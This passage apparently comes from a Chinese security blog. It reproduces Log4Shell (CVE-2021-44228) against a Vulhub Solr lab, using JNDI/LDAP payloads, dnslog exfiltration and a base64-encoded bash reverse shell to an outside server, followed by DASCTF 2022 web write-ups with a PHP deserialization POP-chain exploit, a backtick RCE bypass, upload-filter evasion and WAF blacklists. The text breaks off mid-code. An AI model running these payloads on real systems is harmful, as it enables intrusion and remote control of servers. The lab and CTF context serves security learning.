<li><input checked="" disabled="" type="checkbox"> Apache OFBiz</li>
<li><input disabled="" type="checkbox"> Apache Flume</li>
<li><input disabled="" type="checkbox"> Redis</li>
<li><input disabled="" type="checkbox"> Logstash</li>
<li><input disabled="" type="checkbox"> ElasticSearch</li>
<li><input disabled="" type="checkbox"> Apache Kafka</li>
<li><input disabled="" type="checkbox"> Ghidra</li>
<li><input disabled="" type="checkbox"> Spring-Boot-strater-log4j2</li>
<li><input disabled="" type="checkbox"> VMware vCenter</li>
<li><input disabled="" type="checkbox"> Minecraft</li>
</ul>
<h1 id="0x02-环境搭建（Vulhub）"><a href="#0x02-环境搭建（Vulhub）" class="headerlink" title="0x02 环境搭建（Vulhub）"></a>0x02 环境搭建（Vulhub）</h1><p>这里以vulhub提供的Solr作为靶机环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/vulhub/log4j/CVE-2021-44228]</span><br><span class="line">└─<span class="comment"># docker-compose up -d</span></span><br><span class="line">Creating network <span class="string">&quot;cve-2021-44228_default&quot;</span> with the default driver</span><br><span class="line">Creating cve-2021-44228_solr_1 ... <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>访问靶机环境<code>http://192.168.1.27:8983/solr/#/</code><br><img src="https://img-blog.csdnimg.cn/c3634cf338ba4c0589a428fab6730505.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="0x03-Dnslog出网测试"><a href="#0x03-Dnslog出网测试" class="headerlink" title="0x03 Dnslog出网测试"></a>0x03 Dnslog出网测试</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">action=<span class="variable">$&#123;jndi:ldap://X.X.X.X/exp&#125;</span></span><br><span class="line">action=<span class="variable">$&#123;jndi:ldap://iwpm6l.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>
<p>先获取一个dnslog的子域名，并在靶机中进行ldap请求<br><img src="https://img-blog.csdnimg.cn/c62bf75f35e4432fa24e21ac9d64e390.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/944c69146f18453c9a3cfbac56682033.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>dnslog回显正常，接下来利用dnslog获取java版本信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">action=<span class="variable">$&#123;jndi:ldap://<span class="variable">$&#123;sys:java.version&#125;</span>.iwpm6l.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/e695da4541114fb2adda02dee6323d80.png" alt="在这里插入图片描述"></p>
<h1 id="0x04-JNDI注入反弹shell"><a href="#0x04-JNDI注入反弹shell" class="headerlink" title="0x04 JNDI注入反弹shell"></a>0x04 JNDI注入反弹shell</h1><p>这里用到一个JNDI注入的小工具，可以生成JNDI链接并启动后端相关服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/welk1n/JNDI-Injection-Exploit</span><br></pre></td></tr></table></figure>
<p>可执行程序为jar包，在命令行中运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [<span class="built_in">command</span>] [-A] [address]</span><br></pre></td></tr></table></figure>
<p>命令会被作为参数传入<code>Runtime.getRuntime().exec()</code>函数中</p>
<p>首先运行jar，在本地启动服务，生成恶意的JNDI Links</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@iZ2zec7mjp663ump9wsug3Z:~<span class="comment"># java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success -A 39.107.138.71</span></span><br><span class="line">[ADDRESS] &gt;&gt; 39.107.138.71</span><br><span class="line">[COMMAND] &gt;&gt; <span class="built_in">touch</span> /tmp/success</span><br><span class="line">----------------------------JNDI Links---------------------------- </span><br><span class="line">Target environment(Build <span class="keyword">in</span> JDK whose trustURLCodebase is <span class="literal">false</span> and have Tomcat 8+ or SpringBoot 1.2.x+ <span class="keyword">in</span> classpath):</span><br><span class="line">rmi://39.107.138.71:1099/snyuh8</span><br><span class="line">Target environment(Build <span class="keyword">in</span> JDK 1.7 whose trustURLCodebase is <span class="literal">true</span>):</span><br><span class="line">rmi://39.107.138.71:1099/0puzfm</span><br><span class="line">ldap://39.107.138.71:1389/0puzfm</span><br><span class="line">Target environment(Build <span class="keyword">in</span> JDK 1.8 whose trustURLCodebase is <span class="literal">true</span>):</span><br><span class="line">rmi://39.107.138.71:1099/tcub4d</span><br><span class="line">ldap://39.107.138.71:1389/tcub4d</span><br></pre></td></tr></table></figure>
<p>这里使用JDK 1.8的链接，将其作为JNDI查询的对象，从而使得靶机访问ldap服务，获取到恶意的class文件<br><img src="https://img-blog.csdnimg.cn/bbe479871dc946448a55bce607b3f7c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>返回容器中查看可以看到<code>touch</code>命令成功执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/vulhub/log4j/CVE-2021-44228]</span><br><span class="line">└─<span class="comment"># docker exec -it 28c4b1734b97 /bin/bash</span></span><br><span class="line">root@28c4b1734b97:/opt/solr<span class="comment"># cd /tmp</span></span><br><span class="line">root@28c4b1734b97:/tmp<span class="comment"># ls</span></span><br><span class="line">hsperfdata_root                                          start_2309813075613123050.properties</span><br><span class="line">jetty-0_0_0_0-8983-webapp-_solr-any-7467976691080398284  success</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将命令换成反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDcuMTM4LjcxLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>攻击机监听6666端口成功获取shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@iZ2zec7mjp663ump9wsug3Z:~<span class="comment"># nc -lvvp 6666</span></span><br><span class="line">Listening on [0.0.0.0] (family 0, port 6666)</span><br><span class="line">Connection from 171.43.224.56 13709 received!</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line"></span><br><span class="line">root@28c4b1734b97:/opt/solr/server<span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>2022DASCTF X SU 三月春季挑战赛 Web部分 WriteUp</title>
    <url>/2022/04/05/DASCTF2022-X-SU/</url>
    <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/af9feb596b5b43c2a758f49e834a006f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">v1</span>(<span class="variable">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1-&gt;<span class="title function_ invoke__">world</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="variable language_">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一道常规的反序列题目，审计代码可以得到pop链为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fin::<span class="variable constant_">__destruct</span></span><br><span class="line">↓↓↓</span><br><span class="line">what::<span class="variable constant_">__toString</span></span><br><span class="line">↓↓↓</span><br><span class="line">mix::<span class="variable constant_">run</span></span><br><span class="line">↓↓↓</span><br><span class="line">crow::<span class="variable constant_">__invoke</span></span><br><span class="line">↓↓↓</span><br><span class="line">fin::<span class="variable constant_">__call</span></span><br><span class="line">↓↓↓</span><br><span class="line">mix::<span class="variable constant_">get_flag</span></span><br></pre></td></tr></table></figure>

<p>对于<code>eval(&#39;#&#39; . $this-&gt;m1)</code>，可以用换行符<code>\n</code>绕过，构造如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Fin</span>=<span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$fin2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$what</span>=<span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$Mix</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$crow</span>=<span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$fin</span>=<span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$mix</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix</span>-&gt;m1=<span class="string">&quot;\nsystem(&#x27;find |xargs grep \&quot;flag\&quot;&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$fin</span>-&gt;f1=<span class="variable">$mix</span>;</span><br><span class="line"><span class="variable">$crow</span>-&gt;v1=<span class="variable">$fin</span>;</span><br><span class="line"><span class="variable">$Mix</span>-&gt;m1=<span class="variable">$crow</span>;</span><br><span class="line"><span class="variable">$what</span>-&gt;a=<span class="variable">$Mix</span>;</span><br><span class="line"><span class="variable">$Fin</span>-&gt;f1=<span class="variable">$what</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$Fin</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/403fd23c18d04fd280c0aa252ac4d35f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p><img src="https://img-blog.csdnimg.cn/7b0698be696a4be99c8a991ffd98250c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>一道常规的计算器题目，要想办法rce，以下给出了源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/app.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)  </span><br><span class="line">        </span><br></pre></td></tr></table></figure>
<p>代码中<code>waf(s)</code>函数有很多的屏蔽词，但是没有屏蔽反引号，可以内联执行将反引号内命令的输出作为输入执行<br>构造payload并将回显反弹到服务器上<br><img src="https://img-blog.csdnimg.cn/6b7a3e423eb6475dafcefb5556b78d05.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@iZ2zec7mjp663ump9wsug3Z:~<span class="comment"># nc -lvvp 6666</span></span><br><span class="line">Listening on [0.0.0.0] (family 0, port 6666)</span><br><span class="line">Connection from 117.21.200.166 36271 received!</span><br><span class="line">20220404-132944 10.244.80.46 1+2<span class="comment">#Th1s_is__F1114g bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h1><p>题目只让上传php文件，但是对文件内容有许多过滤，尝试传入一句话木马，发现$被过滤，那就先传一个<code>phpinfo();</code>看看<br><img src="https://img-blog.csdnimg.cn/49300d056e21464ea863544364f98d2b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问phpinfo后发现有成堆的disable_functions，只有少数几个函数可以使用<br><img src="https://img-blog.csdnimg.cn/0cdaaa6d1dbd4058b14cf171e5b6237c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以考虑使用<code>show_source()</code>读取index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>测试后发现<code>show_source</code>在黑名单种，于是可以使用base64进行绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;c2hvd19zb3VyY2U=&quot;</span>)(<span class="string">&quot;../index.php&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>成功读取到源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">light</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">glow</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">onsubmit</span>=&quot;<span class="title">return</span> <span class="title">checkFile</span>()&quot;&gt;</span></span><br><span class="line"><span class="class">    嘿伙计，传个火？！</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">input_file</span>&quot; <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload_file</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">upload</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">span</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">flare</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">fun</span>($<span class="title">var</span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只要好看的php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fun</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span 